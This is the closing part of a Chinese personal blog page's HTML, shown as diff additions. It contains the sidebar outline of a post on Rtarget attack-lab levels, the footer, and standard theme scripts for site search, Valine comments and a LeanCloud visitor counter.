class="nav-text">问题描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提示-1"><span class="nav-number">5.2.</span> <span class="nav-text">提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解决思路-2"><span class="nav-number">5.3.</span> <span class="nav-text">解决思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Rtarget-level-1"><span class="nav-number">6.</span> <span class="nav-text">Rtarget-level-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#问题描述-3"><span class="nav-number">6.1.</span> <span class="nav-text">问题描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解决思路-3"><span class="nav-number">6.2.</span> <span class="nav-text">解决思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Rtarget-level-3"><span class="nav-number">7.</span> <span class="nav-text">Rtarget-level-3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#问题描述-4"><span class="nav-number">7.1.</span> <span class="nav-text">问题描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解决思路-4"><span class="nav-number">7.2.</span> <span class="nav-text">解决思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#事后"><span class="nav-number">8.</span> <span class="nav-text">事后</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sworduo</span>
+
+<!--
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">83.4k</span>
+  
+-->
+</div>
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共83.4k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: 'Ja6j11Iyo36Mmrc5INxiYSIx-gzGzoHsz',
+        appKey: 'v6xwUOCxJcVCwOdrB7ufT9gO',
+        placeholder: 'Come on bro',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("Ja6j11Iyo36Mmrc5INxiYSIx-gzGzoHsz", "v6xwUOCxJcVCwOdrB7ufT9gO");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+<!-- 背景动画 -->
+<script type="text/javascript" src="/js/src/particle.js"></script>
+
+</body>
+</html>
